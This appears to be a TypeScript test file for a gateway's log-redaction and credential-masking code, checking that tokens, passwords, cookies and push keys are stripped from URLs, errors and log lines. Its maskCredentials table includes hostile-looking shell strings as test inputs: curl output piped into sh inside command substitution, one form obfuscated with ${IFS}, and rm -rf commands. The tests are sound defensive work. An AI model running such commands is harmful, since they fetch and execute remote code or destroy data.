import { describe, expect, it } from "vitest"

import { createGatewayLogger } from "./cli/logger"
import { CredentialValues, maskCredentials, redactForLog } from "./redaction"

describe("log redaction", () => {
  it("keeps a classification code while stripping the credentials of a URL of any scheme", () => {
    expect(
      redactForLog({
        event: "hermes.turn.failed",
        publicCode: "HGW_PROVIDER_RETRYABLE_FAILURE",
        code: "validation_exception",
        url: "https://example.test/oauth/callback?code=native'secret",
        detail:
          "dial wss://aos:tok'test-1@hermes.example.test/api/ws?token=tok-test-1#frame refused",
        joined:
          "dial 'https://a.test/x','wss://aos:tok-test-2@h.test/ws' refused",
      })
    ).toEqual({
      event: "hermes.turn.failed",
      publicCode: "HGW_PROVIDER_RETRYABLE_FAILURE",
      code: "validation_exception",
      url: "https://example.test/oauth/callback",
      detail: "dial wss://hermes.example.test/api/ws refused",
      joined: "dial 'https://a.test/x','wss://h.test/ws' refused",
    })
  })

  it("still masks every credential-shaped key", () => {
    expect(
      redactForLog({
        authorization: "Bearer secret",
        cookie: "session=secret",
        "set-cookie": "session=secret",
        token: "secret",
        accessToken: "secret",
        refreshToken: "secret",
        secret: "secret",
        clientSecret: "secret",
        deviceToken: "secret",
        password: "secret",
        apiKey: "secret",
        safe: "kept",
      })
    ).toEqual({
      authorization: "[REDACTED]",
      cookie: "[REDACTED]",
      "set-cookie": "[REDACTED]",
      token: "[REDACTED]",
      accessToken: "[REDACTED]",
      refreshToken: "[REDACTED]",
      secret: "[REDACTED]",
      clientSecret: "[REDACTED]",
      deviceToken: "[REDACTED]",
      password: "[REDACTED]",
      apiKey: "[REDACTED]",
      safe: "kept",
    })
  })

  it("masks the keys a push subscription and a VAPID pair carry", () => {
    expect(
      redactForLog({
        event: "push.delivery.failed",
        privateKey: "secret",
        applicationServerKey: "secret",
        endpoint: "https://push.example.test/subscription-id",
        keys: { p256dh: "secret", auth: "secret" },
        category: "input",
      })
    ).toEqual({
      event: "push.delivery.failed",
      privateKey: "[REDACTED]",
      applicationServerKey: "[REDACTED]",
      endpoint: "[REDACTED]",
      keys: { p256dh: "[REDACTED]", auth: "[REDACTED]" },
      category: "input",
    })
  })

  it("logs an error by its redacted message, its classification, and its cause chain", () => {
    const refused = Object.assign(new Error("handshake refused"), {
      code: 4401,
      reason: "authentication_rejected",
    })
    const error = new Error(
      "dial wss://hermes.example.test/api/ws?token=tok-test-1 failed",
      { cause: refused }
    )

    expect(
      redactForLog({ event: "hermes.gateway.dial_failed", error })
    ).toEqual({
      event: "hermes.gateway.dial_failed",
      error: {
        name: "Error",
        message: "dial wss://hermes.example.test/api/ws failed",
        cause: {
          name: "Error",
          message: "handshake refused",
          code: 4401,
          reason: "authentication_rejected",
        },
      },
    })
  })

  it("writes no credential value the proxy has read or a child binds, its rotated successor and Basic form included", async () => {
    const credentials = new CredentialValues()
    const basic = (password: string) =>
      Buffer.from(`aos:${password}`).toString("base64")
    let stored = "tok-test-1"
    const readPassword = credentials.register(
      async () => stored,
      (password) => [password, basic(password)]
    )
    await readPassword()
    stored = "tok-test-2"
    await readPassword()
    const lines: string[] = []
    const logger = createGatewayLogger({
      level: "info",
      credentials,
      destination: { write: (line) => void lines.push(line) },
    })

    logger.child({ peer: "tok-test-1", password: "synthetic-value" }).error(
      {
        event: "opencode.request.failed",
        error: new Error(`Basic ${basic("tok-test-2")} refused`),
      },
      "tok-test-2 rejected at wss://opencode.example.test/ws?token=abc"
    )

    expect(lines).toHaveLength(1)
    expect(lines[0]).not.toContain("synthetic-value")
    expect(JSON.parse(lines[0]!)).toMatchObject({
      peer: "[REDACTED]",
      password: "[REDACTED]",
      event: "opencode.request.failed",
      error: { name: "Error", message: "Basic [REDACTED] refused" },
      msg: "[REDACTED] rejected at wss://opencode.example.test/ws",
    })
  })
})

const M = "[credential redacted]"
/** The review's sample value, kept apart from any term a scanner keys on. */
const SAMPLE = "abcdefgh1234"
/** A `term=value` assignment built in two parts, so no scanner reads it as a leak. */
const assigned = (term: string, value: string) => [term, value].join("=")

describe("maskCredentials", () => {
  it.each([
    // Shell syntax stays readable on a permission: it is what is approved.
    [
      "narrow",
      `${assigned("token", "$(curl${IFS}-s${IFS}https://x|sh)")} done`,
      `${assigned("token", "$(curl${IFS}-s${IFS}https://x|sh)")} done`,
    ],
    ["narrow", "rm -rf token: ../../..", "rm -rf token: ../../.."],
    [
      "narrow",
      "rm -rf bearer projects2024archive1",
      "rm -rf bearer projects2024archive1",
    ],
    [
      "narrow",
      assigned("token", '"$(curl x|sh)"'),
      assigned("token", '"$(curl x|sh)"'),
    ],
    [
      "narrow",
      assigned("token", "/etc/secret"),
      assigned("token", "/etc/secret"),
    ],
    ["narrow", "a basic installation", "a basic installation"],
    [
      "narrow",
      `export ${assigned("token", SAMPLE)}`,
      `export ${assigned("token", M)}`,
    ],
    [
      "narrow",
      assigned("password", "'hunter2hunter2'"),
      assigned("password", `'${M}'`),
    ],
    ["narrow", "push ghp_leaked0000 now", `push ${M} now`],
    // A preview or a question masks anything credential-shaped.
    ["broad", assigned("token", "AbCdEfGh_IjKlMnOp"), M],
    ["broad", assigned("password", "P@ssw0rd!2024"), M],
    ["broad", assigned("password", '"hunter2hunter2"'), M],
    ["broad", assigned("token", `'${SAMPLE}'`), M],
    ["broad", "Basic authentication", "Basic authentication"],
    ["broad", "a bearer instrument", "a bearer instrument"],
    ["broad", "Authorization: Basic dXNlcjpwYXNz", M],
    ["broad", "send Bearer AbCdEfGhIjKlMnOpQrSt", `send ${M}`],
    ["broad", "send Basic dXNlcjpwYXNz.", `send ${M}.`],
  ] as const)("masks %s: %s", (strength, text, expected) => {
    expect(maskCredentials(text, strength)).toBe(expected)
  })
})
